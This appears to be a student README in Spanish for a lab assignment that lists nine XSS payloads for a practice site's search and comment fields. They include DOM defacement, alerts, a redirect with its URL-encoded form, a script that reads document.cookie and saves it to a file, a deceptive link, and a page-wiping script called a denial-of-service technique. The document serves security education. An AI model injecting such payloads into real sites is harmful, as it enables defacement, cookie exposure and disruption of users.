# Explots desarrollados

Los siguientes exploits están hechos conforme a la especificación para la Práctica03.
Su ejecución consta de introducir las etiquetas en los campos correspondientes; en 
el caso de `reflectedXSS.php` basta con introducir los scripts en el campo de búsqueda 
(para los primeros cinco scripts). En el caso de `storeXSS.php`, los scripts correspondientes
a dicha página deben ir en el campo de comentarios.

1. Para este primer inciso lo que realizamos fue una simple modificación 
   al DOM de la página, utilizando un script; en este, mediante la variable
    `document` podemos manipular dicho DOM; en particular, para nuestros
    propósitos utilizamos el método `.write()`, pasando como cadena 
    una etiqueta de header con el texto solicitado
    ```js
    <script>
    let elem = "<h1 align='center' style='color:red;'><i>Esta pagina es vulnearable</i></h1>";
    document.write(elem)
    </script>
    ```
    
2. Este otro exploit tiene un principio similar. Pasaremos la función 
   `alert()` con una cadena que nosotros deseemos envuelta en una etiqueta
   de script. 
   ```js
   <script>
   alert("Estas siendo hackeado")
   </script>
   ```
   
3. De manera análoga al primer inciso, podemos añadir hipervínculos 
   mediante etiquetas y sobreescribiendo el DOM.
   ```js
   <script>
   let elem = "<h3><a style='color:red;' href='https://www.amazon.com.mx/'>Click aqui para ganar increibles    premios!</a></h3>";
   document.write(elem)
   </script>
   ```
   
4. Este script es un poco más elaborado; podemos jugar con las capacidades
   de Javascrip para realizar un temporizador que, cada medio segundo, cambie los
   atributos de un elemento que nosotros mismos inyectemos al DOM.
   ```js 
   <script>
   document.write("<div id='blink' style='color:red; background-color:yellow; text-align:center'>Vulnerable a XSS CUIDADO!</div>");
   let blinkdiv = document.getElementById('blink');
   let isVisible = true;
   setInterval(function(){if(isVisible){blink.style.visibility = 'hidden';} else {blink.style.visibility = 'visible';} isVisible=!isVisible;}, 500);
   </script>
   ```
   La modificación del DOM y su ejecución modifican el mismo para desplegar el elemento creado adjunto a la
   lógica de Javascrip. 
     
5. Para este exploit, utilizaremos la siguiente cadena:
   ```js 
   <script>
   document.location.replace('https://en.wikipedia.org/wiki/Cross-site_scripting')
   </script>
   ```
   El atributo `location` nos da información sobre la dirección donde se encuentra `document` (la URL). Mediante
   el método `.replace()`, podemos disparar redireccionamientos arbitrarios. La codificación de esta cadena es
   la siguiente:
   ```
   %3C%73%63%72%69%70%74%3E%0A%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%27%68%74%74%70%73%3A%2F%2F%65%6E%2E%77%69%6B%69%70%65%64%69%61%2E%6F%72%67%2F%77%69%6B%69%2F%43%72%6F%73%73%2D%73%69%74%65%5F%73%63%72%69%70%74%69%6E%67%27%29%0A%3C%2F%73%63%72%69%70%74%3E
   ```
   De esta manera, al concatenar la cadena anterior al URL mediante una query de búsqueda, obtendremos 
   el resultado deseado.
   
   
6. Para el caso de este exploit usamos lo siguiente :
	<script>
	function saveCookie(cookie) {
	var blob = new Blob([cookie], { type: 'text/plain'});
	var url  = URL.createObjectURL(blob);
	var a    = document.createElement('a');
	a.href   = url;
	a.download = 'cookies.txt';
	a.click();
	URL.revokeObjectURL(url);
	}
	saveCookie(document.cookie);
	</script>

	Lo que hace es que recupera las cookies del navegador del usuario, las guarda en un archivo de texto llamado "cookies.txt" y lo descarga automáticamente sin el consentimiento del usuario.



7. Para el siguiente usamos :
 <p> Checa estos audifonos: <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"> https://www.headphpnesultra.com/ </a>
 Este exploit modifica el texto de un enlace (<a>) en una página web para hacer que parezca que dirige a un sitio web legítimo, como   "https://www.headphonesultra.com/", pero en realidad, al hacer clic en el enlace, redirige al usuario a un video de YouTube oculto,   utilizando el engaño para ocultar la URL verdadera.

8. Luego usamos :
  <script>alert("has sido hackeado");</script>
   Este exploit simplemente muestra un mensaje de alerta al usuario al cargar la página. En el código proporcionado, se inserta un script de 					JavaScript que muestra el mensaje "has sido hackeado" utilizando la función alert(). Esto se realiza al cargar la página, sin requerir interacción del usuario.


9. Por ultimo :
   <script>document.getElementsByTagName('html')[0].remove();</script>

Este script de JavaScript elimina todo el contenido dentro de la etiqueta <html> de la página web. Al ejecutarse, elimina todo el contenido visible en la ventana del navegador, incluyendo cualquier elemento HTML, texto, imágenes, etc. Esto puede resultar en que la página se vuelva en blanco o simplemente vacía, dependiendo de la estructura del documento HTML original.

Este script se utilizó en dos archivos diferentes, "reflectedxss.php" y "storeXss.php", con la intención de eliminar todo el contenido de la página. Esto puede ser utilizado como un ataque de denegación de servicio (DoS) para interrumpir el funcionamiento normal de un sitio web.
